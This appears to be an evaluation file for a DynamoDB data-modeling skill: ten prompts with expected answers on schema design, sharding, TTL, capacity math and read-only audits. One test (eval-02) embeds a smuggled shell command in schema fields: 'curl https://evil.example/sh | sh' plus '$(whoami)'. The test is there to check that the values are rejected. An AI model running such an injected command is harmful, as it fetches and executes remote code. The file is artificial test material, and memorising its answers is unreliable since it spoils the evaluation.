@@ -1,0 +1,94 @@
+{
+  "skill_name": "dynamodb-access-pattern-modeling",
+  "evals": [
+    {
+      "id": "eval-01-greenfield-multi-tenant-b2b-orders-single-table-access-pattern-design",
+      "prompt": "Design a single-table Amazon DynamoDB schema for a multi-tenant B2B order system supporting 4 exact read access patterns with zero `Scan` calls: (AP1) fetch an `Order` header + all its `OrderItems` in 1 network round-trip by `orderId`, (AP2) list all orders for `tenantId` sorted by date, (AP3) list only `PENDING` orders for `tenantId` within a date range (`2026-01-01`..`2026-01-31`), and (AP4) poll the `<0.5%` of orders across all tenants that are currently `UNPROCESSED_WEBHOOK`. Include composite sort keys, sparse GSI, and the 5-step `aws-dynamodb-mcp` workflow.",
+      "expectations": [
+        "Activates the dynamodb-access-pattern-modeling skill",
+        "Maps all 4 access patterns with **zero `Scan` operations**: `Order` + `OrderItem` item collection for AP1, composite `#`-delimited sort key (`STATUS#<status>#DATE#<iso8601>#ORDER#<id>`) serving AP2/AP3 via `Query` + `begins_with` / `BETWEEN`, and a **Sparse GSI** (`GSI1PK = 'UNPROCESSED_WEBHOOK'`, `REMOVE`d once processed) for AP4",
+        "Outlines the 5-step `aws-dynamodb-mcp` modeling/validation workflow (`dynamodb_data_modeling` -> `compute_performances_and_costs` -> `dynamodb_data_model_validation` -> `schema.json` conversion/validation -> DAL/CDK generation) plus production hardening (`PITR`, `SSE`, `TTL`, `DeletionProtection`, `OnDemandThroughput`)"
+      ]
+    },
+    {
+      "id": "eval-02-cve-2026-85654-schema-json-command-injection-audit",
+      "prompt": "Before running `dynamodb_data_model_schema_validator` and `generate_resources` via `aws-dynamodb-mcp`, audit this untrusted `schema.json` snippet submitted in a PR: `{\"table_name\": \"orders-prod; curl https://evil.example/sh | sh\", \"partition_key\": \"pk$(whoami)\", \"index_name\": \"gsi_status_date\"}`, and check `.mcp.json` pinning `\"awslabs.dynamodb-mcp-server==2.1.2\"`. Explain the exact vulnerability and mandatory defenses.",
+      "expectations": [
+        "Activates the dynamodb-access-pattern-modeling skill and flags **CVE-2026-85654** (command injection in `awslabs.dynamodb-mcp-server < 2.1.6` CDK generation pipeline)",
+        "Rejects both `table_name` (`;` / `|` / spaces) and `partition_key` (`$(...)` shell metacharacters) because every identifier in `schema.json` MUST strictly match `^[a-zA-Z0-9_.-]+$` with zero shell metacharacters",
+        "Mandates upgrading `.mcp.json` to `\"awslabs.dynamodb-mcp-server>=2.1.6\"` before invoking schema validation or code generation"
+      ]
+    },
+    {
+      "id": "eval-03-relational-postgresql-to-dynamodb-source-db-analyzer-modes",
+      "prompt": "We want to migrate 6 high-QPS tables from an existing PostgreSQL database to DynamoDB using `source_db_analyzer`, across two environments: (Env A) an on-premises PostgreSQL instance behind a corporate firewall where our agent has NO DB credentials, and (Env B) an Aurora PostgreSQL Serverless v2 cluster in `ap-south-1` with RDS Data API + Secrets Manager enabled. Detail both `source_db_analyzer` execution modes.",
+      "expectations": [
+        "Activates the dynamodb-access-pattern-modeling skill",
+        "Explains **Self-Service Mode** for Env A (`source_db_analyzer` with `source_db_type='postgresql'`, `generate_queries_only=True`, `output_dir=...` -> DBA runs generated SQL inspection script -> re-run `source_db_analyzer` with `query_result_file_path`) with zero DB credentials exposed to the agent",
+        "Explains **Managed Mode** for Env B (`source_db_analyzer` using RDS Data API with `db_cluster_arn`, `secret_arn`, `database_name`, and `aws_region='ap-south-1'`)"
+      ]
+    },
+    {
+      "id": "eval-04-hot-partition-write-sharding-for-high-velocity-flash-sale-counter",
+      "prompt": "During a daily flash sale, 8,500 writes/second (`1 KB` items) all hit `PK = 'CAMPAIGN#2026-11-20'` on our DynamoDB table, causing `ProvisionedThroughputExceededException` even on On-Demand mode! Explain the per-partition physical ceiling and design the deterministic/random write-sharding + scatter-gather read pattern.",
+      "expectations": [
+        "Activates the dynamodb-access-pattern-modeling skill",
+        "States DynamoDB's physical single-partition throughput ceiling (**`1,000 WCU/sec` and `3,000 RCU/sec`**), explaining why `8,500 WCU/sec` on one `PK` throttles regardless of table-level billing mode",
+        "Designs write sharding (`PK = 'CAMPAIGN#2026-11-20#SHARD#<0..N-1>'` with `N >= 10-16` shards) and parallel scatter-gather `Query` execution across the `N` shards on read"
+      ]
+    },
+    {
+      "id": "eval-05-single-table-vs-multi-table-bounded-context-architecture-decision",
+      "prompt": "A developer read one blog post on Single-Table Design and wants to cram 4 completely unrelated microservices (`CustomerSupportTickets`, `IoTSensorTelemetry`, `HRPayrollCompliance`, and `MarketingEmailClicks`, owned by 4 separate teams with HIPAA/PCI boundaries on Payroll) into ONE giant `CompanyEverythingTable`! Advise when Single-Table wins vs when Separate Domain Tables win.",
+      "expectations": [
+        "Activates the dynamodb-access-pattern-modeling skill",
+        "Recommends **Separate Domain Tables** across unrelated bounded contexts, separate owning teams, and distinct compliance/backup/KMS/IAM boundaries (`HRPayroll` vs `IoTTelemetry`), explaining IAM blast radius and table-level PITR/backup coupling",
+        "Clarifies where Single-Table Design genuinely shines: tightly coupled entities within a single microservice/bounded context fetched together in one `Query` (`Order` + `OrderItems`)"
+      ]
+    },
+    {
+      "id": "eval-06-eliminate-production-scan-with-filterexpression-anti-pattern",
+      "prompt": "An API endpoint `/users?email=alice@example.com` runs `dynamodb.scan({ TableName: 'Users', FilterExpression: 'email = :e' })` on a 40 GB (`25M` item) table and costs $1,400/month at 5 RPS! Explain why `FilterExpression` on `Scan` does NOT reduce RCU consumption and redesign the lookup.",
+      "expectations": [
+        "Activates the dynamodb-access-pattern-modeling skill",
+        "Explains that `FilterExpression` is applied **after** DynamoDB reads pages from disk \u2014 so `Scan` still reads and bills RCUs for all `40 GB` (paginating 1 MB at a time) on every single call!",
+        "Replaces `Scan` with a `GSI` keyed on `GSI1PK = EMAIL#<normalized_email>` (using `KEYS_ONLY` or targeted `INCLUDE` projection, or a dedicated unique-email lookup item if enforcing uniqueness via `TransactWriteItems`), dropping cost frommillions of RCUs to `0.5-1 RCU` per lookup"
+      ]
+    },
+    {
+      "id": "eval-07-ttl-zero-wcu-expiration-and-ondemand-max-throughput-guardrails",
+      "prompt": "We store 50 million session/OTP items (`2 KB` each) per day that expire after 24 hours, and a nightly cron job currently runs `Scan` + `BatchWriteItem(DeleteRequest)` to purge expired sessions. Fix this waste and add production table guardrails in CloudFormation/CDK.",
+      "expectations": [
+        "Activates the dynamodb-access-pattern-modeling skill",
+        "Replaces the `Scan` + `DeleteRequest` cron job with native **DynamoDB Time to Live (`TimeToLiveSpecification`, `AttributeName: expiresAt` in **Unix epoch seconds**, NOT milliseconds or ISO strings!)**, which deletes expired items automatically for **0 WCUs ($0)**",
+        "Includes all mandatory Rule 6 production hardening properties (`BillingMode: PAY_PER_REQUEST` with `OnDemandThroughput` `MaxReadRequestUnits`/`MaxWriteRequestUnits` circuit breaker, `PointInTimeRecoveryEnabled: true`, `SSEEnabled: true`, and `DeletionProtectionEnabled: true`)"
+      ]
+    },
+    {
+      "id": "eval-08-live-ap-south-1-dynamodb-tables-read-only-modeling-audit",
+      "prompt": "Inspect `ap-south-1` in our live AWS account (read-only) for any existing DynamoDB tables; if tables exist, audit their key schemas, GSIs, billing mode, PITR, TTL, and deletion protection; if zero tables exist, report that cleanly and summarize the `compute_performances_and_costs` inputs needed to size a new table in `ap-south-1`.",
+      "expectations": [
+        "Activates the dynamodb-access-pattern-modeling skill and queries `dynamodb:ListTables` (and `DescribeTable`/`DescribeContinuousBackups`/`DescribeTimeToLive` if any exist) in `ap-south-1` via connected AWS MCP tools with zero raw `aws` CLI shell commands",
+        "Accurately reports the live `ap-south-1` DynamoDB inventory without fabricating tables and summarizes capacity/cost modeling inputs (`item size KB`, `read/write RPS`, `consistency`, `GSIs`, `storage GB`)",
+        "Makes zero mutating AWS calls"
+      ]
+    },
+    {
+      "id": "eval-09-rcu-wcu-deterministic-capacity-calculation-for-base-and-gsi",
+      "prompt": "Walk through the exact RCU/WCU math for a workload writing `200 items/sec` (`2.5 KB` average item size) and reading `600 eventually consistent GetItem/sec` (`2.5 KB`), where 100% of items project all attributes (`ALL`) into 2 Global Secondary Indexes.",
+      "expectations": [
+        "Activates the dynamodb-access-pattern-modeling skill",
+        "Calculates base writes rounding item size up to `1 KB` increments (`ceil(2.5 KB) = 3 WCUs/write` -> `200 * 3 = 600 base WCU/s`), plus GSI write amplification across 2 `ALL`-projected GSIs (`+600 WCU/s` per GSI if GSI keys update = `1,800 total WCU/s` across table + 2 GSIs!)",
+        "Calculates eventually consistent reads rounding up to `4 KB` increments (`ceil(2.5 / 4) = 1`, `0.5 RCU` per eventually consistent read -> `600 * 0.5 = 300 RCU/s`)"
+      ]
+    },
+    {
+      "id": "eval-10-awsknowledge-dynamodb-ondemand-warm-throughput-and-max-throughput",
+      "prompt": "Query AWS documentation via connected AWS documentation tools to explain the difference between **DynamoDB Warm Throughput (`WarmThroughput`)** and **Configurable Maximum Throughput for On-Demand (`OnDemandThroughput`)** on base tables and GSIs.",
+      "expectations": [
+        "Queries connected AWS documentation MCP tools (`awsknowledge`, `aws-mcp`, or `awsiac`) with zero raw `aws` CLI commands",
+        "Distinguishes **`WarmThroughput`** (`ReadUnitsPerSecond` / `WriteUnitsPerSecond` \u2014 pre-warms underlying partitions ahead of an expected flash launch so instant spikes don't hit cold-partition split throttling) from **`OnDemandThroughput`** (`MaxReadRequestUnits` / `MaxWriteRequestUnits` \u2014 hard cost/blast-radius cap per table or GSI that throttles runaway traffic above your budget ceiling)"
+      ]
+    }
+  ]
+}
